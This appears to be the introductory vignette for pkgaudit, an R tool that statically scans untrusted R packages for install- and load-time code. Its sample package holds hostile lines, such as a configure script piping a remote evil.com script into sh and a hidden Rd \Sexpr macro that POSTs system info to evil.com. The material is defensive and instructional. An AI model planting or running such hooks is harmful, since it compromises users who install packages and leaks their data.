# Getting Started with pkgaudit

pkgaudit reports which parts of an R package can execute, when they
execute, and what they do, so that an untrusted package can be reviewed
before it is installed and loaded. It never executes the code it scans.

A finding is not an accusation. Flagged files and code are often
legitimate: `configure` scripts exist for system-dependent
configuration, and many packages call system tools or download files for
good reason. pkgaudit identifies what deserves a reader’s attention, not
what is malicious.

``` r

library(pkgaudit)
```

## How a package is covered

pkgaudit accounts for every file it can identify as code and records
what it made of each one, in a `coverage` frame:

- **parsed** – R, wherever a package carries it. Matched against R’s
  parse tree, so a finding is located by line and column and attributed
  to the construct that encloses it.
- **matched** – shell scripts and Make-like files, matched as text. Less
  precise: a match inside a comment reads the same as one in a live
  command.
- **exportable** – C, C++, Fortran, Rust, Python, JavaScript, and
  vignette chunks in those languages. Not read by pkgaudit;
  [`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
  writes them out for a scanner that reads them.
- **unexamined** – present and accounted for, but not read: serialized
  `.rda` and `.rds` objects, binaries, and files no rule claims.
- **error** – pkgaudit tried to read the file and could not, because it
  was too large, unreadable, or would not parse. Distinct from
  `unexamined`, where it never tried.

Coverage is never complete, and is not meant to be. What the frame
offers is not completeness but legibility: a clean result can be checked
rather than taken on trust, because the scan says what it did not look
at.

## Rules

pkgaudit separates *when* code executes from *what* code does, using
four categories of rule.

- **File contexts** tell the scan which files to read, and how. Most
  exist so that a file’s *contents* can be reported – `R/`, `man/`,
  `vignettes/`, `tests/`, `data/`. A file context is a finding in its
  own right only when it both runs automatically *and* can only be
  matched as text: in practice the shell scripts and Make-like files,
  where pkgaudit cannot say what the file does, only that it runs, so
  the file itself is what needs reading.
- **Code contexts** say when a piece of R code runs. Some are lifecycle
  hooks matched by a rule – `.onLoad()`, `.onAttach()` and their kin.
  The rest are computed from where the code sits: the top level of `R/`,
  a help-file example, a `\Sexpr{}` macro at a given stage, a vignette
  chunk, a test.
- **Patterns** are security-relevant function calls, matched against R’s
  parse tree. [`system()`](https://rdrr.io/r/base/system.html) executes
  shell commands; [`source()`](https://rdrr.io/r/base/source.html) can
  fetch and execute a remote script.
- **Matches** are regular-expression matches in shell scripts and
  Make-like files. `curl` and `wget`, for example, can fetch a remote
  payload or send data to a remote host while a package is being built
  or installed.

A code context is not a finding of its own. It travels on `patterns`, as
the column a finding’s lifecycle phases are derived from.

The full rule set is documented in [Rule
Coverage](https://tylerjssmith.github.io/pkgaudit/articles/rules.md).

## Rules and database integrity

The rules live in a versioned SQLite database shipped with the package.
[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
reads it;
[`rules_version()`](https://tylerjssmith.github.io/pkgaudit/reference/rules_version.md)
reports the version.

``` r

rules_version()
#> [1] "0.4.0"

rules <- load_rules()
vapply(rules, nrow, integer(1))
#> file_contexts code_contexts      patterns       matches        phases 
#>            45             6            21            11            65
```

`phases` holds one row per context code can execute in: every file- and
code-context rule, plus the computed contexts.

Not every file-context rule is a finding. Rules covering `R/` and `man/`
tell the scan which files to read; only a rule with `report = TRUE`
contributes a row to `result$file_contexts`.

``` r

table(rules$file_contexts$type, rules$file_contexts$report)
#>        
#>         FALSE TRUE
#>   make      0    7
#>   other     7    0
#>   qmd       1    0
#>   R        14    1
#>   Rd        3    0
#>   Rmd       1    0
#>   Rnw       1    0
#>   rsp       1    0
#>   shell     1    8
```

A modified database is one way to evade a scanner.
[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
verifies the database against its bundled SHA-256 sidecar on every call
and refuses to load a modified one. The hash of an installed copy can
also be checked against the value published in the
[README](https://github.com/tylerjssmith/pkgaudit#database-integrity):

``` r

digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
#> [1] "d73ed7f7e41125d89a524e22d82ac467c0ca2a93991781c8b5015f789fcf0127"
```

## An example package

`untrustedpkg` is a small source package shipped with pkgaudit that does
three things a reviewer would want to know about. It is never built,
checked, installed, or loaded; it exists only to be scanned.

``` r

tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)

exdir <- file.path(tempdir(), "untrustedpkg-example")
utils::untar(tarball, exdir = exdir)

pkg <- file.path(exdir, "untrustedpkg")
list.files(pkg, recursive = TRUE)
#> [1] "configure"         "DESCRIPTION"       "man/fetch_data.Rd"
#> [4] "R/fetch.R"         "R/zzz.R"
```

A `configure` script runs during installation from source, before any R
code is loaded. This one fetches a remote script and pipes it into a
shell:

    #!/bin/sh
    echo configuring
    curl -s https://www.evil.com/evil.sh | sh

`.onLoad()` runs automatically when the namespace is loaded, so its body
executes on
[`library(untrustedpkg)`](https://rdrr.io/r/base/library.html). An
ordinary function, by contrast, runs only if someone calls it:

    .onLoad <- function(libname, pkgname) {
      system("uname -a")
    }
    fetch_data <- function(url) {
      download.file(url, tempfile())
    }

A help file carries R code too, in two places that run at different
times. Its `\examples{}` block runs under `R CMD check`. Its `\Sexpr{}`
macro runs whenever the page is rendered – during `R CMD build` and
installation from source – and here it is written
`\Sexpr[results=hide]{...}`, which suppresses the output. A person
reading `?fetch_data` sees the description and the example, but nothing
of the `httr::POST()` call: it runs on their machine, invisibly, when
the page is built.

    \name{fetch_data}
    \alias{fetch_data}
    \title{Fetch Data From a URL}
    \description{
      Downloads the contents of \code{url} to a temporary file.
      \Sexpr[results=hide]{httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()))}
    }
    \usage{fetch_data(url)}
    \arguments{\item{url}{A URL to download.}}
    \examples{
    download.file("https://www.evil.com/data.csv", tempfile())
    }

The script that generates this package is in
[data-raw/create_untrustedpkg.R](https://github.com/tylerjssmith/pkgaudit/blob/master/data-raw/create_untrustedpkg.R).

## Scanning a package directory

[`audit_package()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_package.md)
scans an unpacked source package. Printing the result gives the scan
metadata and the number of findings by category.

``` r

result <- audit_package(pkg)

print(result)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> Path:      /tmp/RtmpZflpLZ/untrustedpkg-example/untrustedpkg
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-11 21:55 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```

[`summary()`](https://rdrr.io/r/base/summary.html) reports the findings
themselves: how often each rule matched, split by the lifecycle phase
the code runs in, with the MITRE ATT&CK techniques the rule carries.
Phases overlap – building a package with vignettes also installs and
loads it – so one occurrence is counted under every phase it runs in.

``` r

summary(result)
#> --- pkgaudit Summary --------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> Path:      /tmp/RtmpZflpLZ/untrustedpkg-example/untrustedpkg
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-11 21:55 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> --- R Patterns --------------------------------------------------------------
#> phase            rule            n   attck
#> at_build         httr            1   T1041
#> at_build         system          1   T1059.003 T1059.004
#> at_check         download_file   1   T1105
#> at_check         httr            1   T1041
#> at_check         system          1   T1059.003 T1059.004
#> at_install_src   httr            1   T1041
#> at_install_src   system          1   T1059.003 T1059.004
#> at_load          system          1   T1059.003 T1059.004
#> none             download_file   1   T1105
#> 
#> --- Shell / Make Matches ----------------------------------------------------
#> phase            rule            n   attck
#> at_build         curl            1   T1041 T1105
#> at_check         curl            1   T1041 T1105
#> at_install_src   curl            1   T1041 T1105
#> 
#> --- Coverage ----------------------------------------------------------------
#> status       top_level   type          files   lines
#> parsed       R/          R                 2       6
#> parsed       man/        Rd                1      12
#> matched      .           shell             1       3
#> unexamined   .           DESCRIPTION       1
#> 
#> --- Errors ------------------------------------------------------------------
#> No exceptions were raised.
```

Both methods accept `path = FALSE`, which omits the local filesystem
path. This matters when sharing results, since the path may reveal a
username or directory layout.

## Reading the result

A `pkgaudit` object is a named list of ordinary data frames, so findings
can be filtered, joined and reported on directly.

``` r

names(result)
#> [1] "file_contexts" "patterns"      "matches"       "coverage"     
#> [5] "errors"        "metadata"
```

`patterns` locates each finding by file, line and column, and records
the code context it sits in. Each frame also carries the rule’s
`message`, its ATT&CK techniques, and one logical column per lifecycle
phase; those are omitted below to keep the output readable.

``` r

result$patterns[, c("rule", "file_context", "line_number", "code_context",
                    "guarded", "indirect", "preview")]
#>            rule      file_context line_number     code_context guarded indirect
#> 1 download_file         R/fetch.R           2            Other   FALSE    FALSE
#> 2        system           R/zzz.R           2      onLoad_base   FALSE    FALSE
#> 3 download_file man/fetch_data.Rd          11      Rd_examples   FALSE    FALSE
#> 4          httr man/fetch_data.Rd           6 Rd_Sexpr_install   FALSE    FALSE
#>                                                                       preview
#> 1                                              download.file(url, tempfile())
#> 2                                                          system("uname -a")
#> 3                  download.file("https://www.evil.com/data.csv", tempfile())
#> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
```

Two columns describe how the code is *reached* rather than what it is.
`guarded` is `TRUE` for code that ships but the lifecycle does not run –
a `\dontrun{}` block, or a vignette chunk marked `eval=FALSE`.
`indirect` is `TRUE` where the call was made through the function’s name
rather than the function, as in `do.call("system", ...)`; such a finding
is reported under the rule that owns the name, so filtering on `rule`
finds every call to it however it was spelled.

`matches` mirrors `patterns` but carries no `code_context`: a shell
script has no R parse tree to sit in, so a match is located by file
alone.

``` r

result$matches[, c("rule", "file_context", "line_number", "preview")]
#>   rule file_context line_number                                   preview
#> 1 curl    configure           3 curl -s https://www.evil.com/evil.sh | sh
```

`coverage` accounts for the files themselves.

``` r

result$coverage[, c("file_context", "language", "status", "reason", "lines")]
#>        file_context language     status  reason lines
#> 1       DESCRIPTION     <NA> unexamined no_rule    NA
#> 2         R/fetch.R        R     parsed    <NA>     3
#> 3           R/zzz.R        R     parsed    <NA>     3
#> 4         configure    shell    matched    <NA>     3
#> 5 man/fetch_data.Rd       Rd     parsed    <NA>    12
```

### Filtering by phase

Every findings frame carries one logical column per phase:
`at_autoconf`, `at_build`, `at_check`, `at_install_src`,
`at_install_bin`, `at_load`, `at_attach`, `at_unload`, `at_detach`. A
pattern inside an ordinary function is `FALSE` for all of them – it runs
only if something calls it.

``` r

result$patterns[result$patterns$at_load,
                c("rule", "file_context", "code_context")]
#>     rule file_context code_context
#> 2 system      R/zzz.R  onLoad_base
```

[`summary()`](https://rdrr.io/r/base/summary.html) takes a `phase`
argument for the same purpose, including `"none"` for code that ships
but runs at no phase.

``` r

summary(result, phase = "at_load", path = FALSE)
#> --- pkgaudit Summary --------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-11 21:55 UTC with pkgaudit v0.4.0, rules v0.4.0
#> Phases:    at_load
#> 
#> --- R Patterns --------------------------------------------------------------
#> phase     rule     n   attck
#> at_load   system   1   T1059.003 T1059.004
#> 
#> --- Shell / Make Matches ----------------------------------------------------
#> No matches were found.
#> 
#> --- Coverage ----------------------------------------------------------------
#> No files were found.
#> 
#> --- Errors ------------------------------------------------------------------
#> No exceptions were raised.
```

## Scanning a tarball

The more common workflow is to scan a package that has not been
installed.
[`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
validates a `.tar.gz` source package, extracts it to a temporary
directory, scans it, and removes the directory.

``` r

print(audit_tarball(tarball), path = FALSE)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source tarball)
#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
#> Scanned:   2026-08-11 21:55 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```

Because an untrusted archive is itself an attack surface, the tarball is
checked before anything is extracted. The check fails closed, refusing
the whole archive, on any link entry, path traversal, absolute or
malformed path, or an archive that does not extract to exactly one
top-level directory. It also enforces limits on entry count,
uncompressed size, and compression ratio, guarding against archives that
expand to exhaust the disk.

``` r

str(validate_tar(tarball))
#> 'data.frame':    7 obs. of  4 variables:
#>  $ name    : chr  "untrustedpkg/configure" "untrustedpkg/DESCRIPTION" "untrustedpkg/man/" "untrustedpkg/man/fetch_data.Rd" ...
#>  $ type    : chr  "file" "file" "dir" "file" ...
#>  $ linkname: chr  "" "" "" "" ...
#>  $ size    : int  69 150 0 381 0 65 63
```

## Carrying a scan to other tools

[`emit_sarif()`](https://tylerjssmith.github.io/pkgaudit/reference/emit_sarif.md)
renders a result as SARIF 2.1.0, the format code-scanning tools publish
results in. It returns the document as a string and writes nothing.

``` r

sarif <- emit_sarif(result)
substr(sarif, 1, 200)
#> {
#>   "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
#>   "version": "2.1.0",
#>   "runs": [
#>     {
#>       "tool": {
#>         "driver": {
#>           "name": "pkgaudit",
#>           "version": "0.4.0",
#> 
```

Written to a file and opened in an editor with a SARIF viewer, each
finding appears on the line it was found. Rule identifiers are
namespaced by the kind of rule – `pattern/curl`, `match/curl` – because
a rule name is unique only within its kind. `level` is `warning` for a
pattern or match whose code executes during at least one lifecycle phase
and `note` for everything else. That is a mapping of pkgaudit’s phase
model onto SARIF’s severity field, not a severity ranking, which
pkgaudit does not make.

[`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
writes the code pkgaudit cannot read into a directory a scanner such as
Semgrep can be pointed at. A whole file is copied verbatim; a vignette
chunk in a language with no analyser is written into a file of its own,
blank-padded so that its code sits at the same line numbers it occupies
in the source. A finding another tool reports at line 40 of
`intro.python.py` is therefore at line 40 of `intro.Rmd`.

`untrustedpkg` is R and shell throughout, so there is nothing to hand on
and the manifest comes back empty:

``` r

manifest <- export_unscanned(result, file.path(tempdir(), "for-semgrep"),
                             source = pkg)
nrow(manifest)
#> [1] 0
```

For a package carrying compiled code, each row of the manifest maps an
exported file back to where it came from. The directory has no default:
naming one is how the caller consents to being written to.

## Interpreting a scan

A clean scan is weak evidence of safety. pkgaudit reasons about syntax,
so sufficiently indirect code can evade any pattern rule. A call whose
target is a string literal is followed – `do.call("system", ...)` is
reported as a `system` finding – but one assembled at runtime is not,
since pkgaudit evaluates nothing. Matches are weaker still, being
matched against text rather than a parse tree, so they both miss more
and flag more: a `curl` inside a comment is reported, and one assembled
from shell variables is not.

A scan with findings is better understood as a reading list than a
verdict. In review, the questions worth asking are roughly:

- Does the package need this capability at all, given what it claims to
  do?
- Does it run without being asked, at install or load time, rather than
  when a user calls a function?
- Does it reach the network, and if so, is the destination fixed and
  identifiable in the source?
- Is the code being run visible in the source, or is it assembled,
  decoded, or fetched at runtime?
- What did the scan not read, and does any of it run automatically?

Findings that answer badly on several of these at once are the ones to
read closely.
